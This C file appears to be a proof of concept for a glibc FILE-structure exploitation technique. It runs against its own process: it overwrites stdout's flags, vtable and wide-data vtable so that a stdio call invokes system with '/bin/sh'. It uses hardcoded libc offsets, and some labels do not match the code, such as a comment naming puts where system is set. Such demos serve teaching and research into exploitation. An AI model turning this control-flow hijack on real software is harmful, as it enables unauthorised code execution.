#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
 
char* stderr2;
 
int
main () {
  setbuf(stdout, 0);
  setbuf(stdin, 0);
  setbuf(stderr, 0);
 
  size_t puts_addr = (size_t)&puts;
  printf("[*] puts address: %p\n", (void *)puts_addr);
 
  size_t libc_base_addr = puts_addr - 0x82c80;
  printf("[*] libc base address: %p\n", (void *)libc_base_addr);
 
  size_t _IO_2_1_stdout_addr = libc_base_addr + 0x20a5c0;
  printf("[*] _IO_2_1_stderr_ address: %p\n", (void *)_IO_2_1_stdout_addr);
 
  size_t _IO_wfile_jumps_addr = libc_base_addr + 0x208228;
  printf("[*] _IO_wfile_jumps addr: %p\n", (void*) _IO_wfile_jumps_addr);
 
  stderr2 = (char*) _IO_2_1_stdout_addr;
  char *wide_data = calloc(0x200, 1);
  char *wide_vtable = calloc(0x200, 1);
  puts("[*] allocate two 0x200 chunks");
 
  puts("[+] set stdout->_flags to hack!");
  *(size_t *)(stderr2) = (size_t) 0x68732f6e69622f;
 
  puts("[+] set stdout->vtable to _IO_wfile_jumps_addr - 0x18");
  *(size_t *)(stderr2 + 0xd8) = (size_t) _IO_wfile_jumps_addr - 0x18;
 
  puts("[+] Set fp->_wide_data and _wide_data->_wide_vtable to custom chunks");
  *(size_t *)(stderr2 + 0xa0) = (size_t) wide_data;
  *(size_t *)(wide_data + 0xe0) = (size_t) wide_vtable;
 
  puts("[+] set _wide_data->_IO_write_ptr to 1");
  *(size_t *)(wide_data + 0x20) = (size_t) 0x1;

  puts("[+] _wide_vtable->overflow = puts");
  *(size_t *)(wide_vtable + 0x18) = (size_t) &system;
 
  printf("asdf");
}